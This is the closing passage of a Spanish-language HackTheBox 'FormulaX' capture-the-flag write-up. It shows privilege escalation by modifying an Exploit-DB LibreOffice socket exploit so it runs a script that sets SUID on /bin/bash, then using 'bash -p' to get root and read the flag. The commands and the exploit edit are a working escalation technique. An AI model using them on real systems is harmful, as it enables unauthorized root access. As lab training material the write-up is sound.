</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>     Path: /opt/exploitdb/exploits/multiple/remote/46544.py
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>    Codes: N/A
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span> Verified: False
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>File Type: Python script, ASCII text executable
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>Copied to: /home/pointedsec/Desktop/formulax/exploits/46544.py
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>â”Œâ”€[192.168.1.52]â”€[pointedsec@parrot]â”€[~/Desktop/formulax/exploits]
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>â””â”€â”€â•¼ [â˜…]$ mv 46544.py rce.py</span></span></code></pre></div>
<p>Modificamos el exploit para asignar el permiso de SUID al binario<code>/bin/bash</code>.
<img src="images/Screenshot_27.png" alt="Write-up Image"></p>
<p>Ahora nos pasamos el exploit a la mÃ¡quina vÃ­ctima.</p>
<p>Ejecutamos el script como sudo para establecer la conexiÃ³n y poder conectarnos al socket para realizar la explotaciÃ³n.</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>kai_relay@formulax:/tmp$ sudo /usr/bin/office.sh</span></span></code></pre></div>
<p>Y ahora como cualquier usuario (ya tenÃ­a abierta una terminal como <code>frank_dorky</code>, no hace falta ejecutar el exploit como <code>kai_relay</code>)</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>rank_dorky@formulax:/tmp$ python3 rce.py --host 127.0.0.1 --port <span style="color:#ff0;font-weight:bold">2002</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>[+] Connecting to target...
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>[+] Connected to 127.0.0.1</span></span></code></pre></div>
<p>Y vemos lo siguiente en la otra terminal donde estamos ejecutando el script.
<img src="images/Screenshot_28.png" alt="Write-up Image"></p>
<p>Vamos a cambiar el exploit de nuevo y vamos a especificar que queremos que ejecute un archivo en bash que vamos a crear ahora mismo.</p>
<p><img src="images/Screenshot_29.png" alt="Write-up Image"></p>
<p>Le asignamos permisos de ejecuciÃ³n <code>kai_relay@formulax:/tmp$ chmod +x pwn.sh</code></p>
<p>Modificamos el exploit de nuevo..</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>shell_execute.execute(<span style="color:#0ff;font-weight:bold">&#34;/tmp/pwn.sh&#34;</span>, <span style="color:#0ff;font-weight:bold">&#39;&#39;</span>,<span style="color:#ff0;font-weight:bold">1</span>)</span></span></code></pre></div>
<p>Ahora al lanzar el exploit&hellip;</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>frank_dorky@formulax:/tmp$ python3 rce.py --host 127.0.0.1 --port <span style="color:#ff0;font-weight:bold">2002</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>[+] Connecting to target...
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>[+] Connected to 127.0.0.1</span></span></code></pre></div>
<p>No nos muestra nada por la otra terminal&hellip;
<img src="images/Screenshot_30.png" alt="Write-up Image"></p>
<p>Y ya vemos que se ha asignado el permiso SUID a la bash.
<img src="images/Screenshot_31.png" alt="Write-up Image"></p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>frank_dorky@formulax:/tmp$ bash -p
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>bash-5.1# id
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>uid=1002(frank_dorky) gid=1002(frank_dorky) euid=0(root) groups=1002(frank_dorky)</span></span></code></pre></div>
<p>Â¡Y ya hemos escalado privilegios!</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>bash-5.1# cat /root/root.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>04da1f3886a9...</span></span></code></pre></div>
<p>Happy Hacking! ğŸš€</p>

  </content>
  <p>
    
      <a href="/tags/hackthebox/">#HackTheBox</a>&nbsp;&nbsp;
    
      <a href="/tags/formulax/">#FormulaX</a>&nbsp;&nbsp;
    
      <a href="/tags/writeup/">#Writeup</a>&nbsp;&nbsp;
    
      <a href="/tags/cybersecurity/">#Cybersecurity</a>&nbsp;&nbsp;
    
      <a href="/tags/penetration-testing/">#Penetration Testing</a>&nbsp;&nbsp;
    
      <a href="/tags/ctf/">#CTF</a>&nbsp;&nbsp;
    
      <a href="/tags/xss/">#XSS</a>&nbsp;&nbsp;
    
      <a href="/tags/abusing-web-sockets/">#Abusing Web Sockets</a>&nbsp;&nbsp;
    
      <a href="/tags/abusing-libreoffice-socket/">#Abusing LibreOffice Socket</a>&nbsp;&nbsp;
    
      <a href="/tags/reverse-shell/">#Reverse Shell</a>&nbsp;&nbsp;
    
      <a href="/tags/privilege-escalation/">#Privilege Escalation</a>&nbsp;&nbsp;
    
      <a href="/tags/rce/">#RCE</a>&nbsp;&nbsp;
    
      <a href="/tags/exploit/">#Exploit</a>&nbsp;&nbsp;
    
      <a href="/tags/abusing-simple-git/">#Abusing Simple-Git</a>&nbsp;&nbsp;
    
      <a href="/tags/abusing-mongodb/">#Abusing MongoDB</a>&nbsp;&nbsp;
    
      <a href="/tags/password-cracking/">#Password Cracking</a>&nbsp;&nbsp;
    
      <a href="/tags/port-forwarding/">#Port Forwarding</a>&nbsp;&nbsp;
    
      <a href="/tags/user-pivoting/">#User Pivoting</a>&nbsp;&nbsp;
    
      <a href="/tags/creating-admin-account-in-librenms/">#Creating Admin Account in LibreNMS</a>&nbsp;&nbsp;
    
      <a href="/tags/abusing-librenms/">#Abusing LibreNMS</a>&nbsp;&nbsp;
    
      <a href="/tags/credentials-reuse/">#Credentials Reuse</a>&nbsp;&nbsp;
    
      <a href="/tags/linux/">#Linux</a>&nbsp;&nbsp;
    
  </p>

    </main>
    <footer>
      
  <span>Â© 2024 pointedsec</span>



    </footer>

    
</body>
</html>
